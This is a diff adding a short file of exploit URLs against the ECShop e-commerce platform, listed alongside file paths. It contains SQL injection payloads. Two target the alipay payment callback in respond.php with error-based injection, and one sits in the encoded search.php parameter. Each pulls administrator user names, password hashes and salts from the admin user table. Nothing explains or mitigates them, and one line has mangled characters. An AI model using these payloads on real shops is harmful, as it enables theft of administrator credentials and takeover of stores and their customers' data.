@@ -1,0 +1,13 @@
+includes/init.php
+
+/includes/modules/payment/alipay.php
+
+/respond.php?code=alipay&subject=00&out_trade_no=%000'%20and%20(select%20*%20from(select%20count(*),concat(floor(rand(0)*2),(select%20concat(000x7c,user_name,000x7c,password,000x7c,ec_salt)%20from%20ecs_admin_user%20limit%201))a%20from%20information_schema.tables%20group%20by%20a)b)%20--%20by%20a
+
+
+user.php
+
+/search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319pTXcopyd-code
+
+ecshop/respond.php?code=alipay&subject=0&out_trade_no=%00¡ä and (sel ect * from (sel ect count(*),concat(floor(rand(0)*2),(sel ect concat(user_name,password) from ecs_admin_user limit 1))a from information_schema.tables group by a)b) ¡ª By ecshop.co/
+
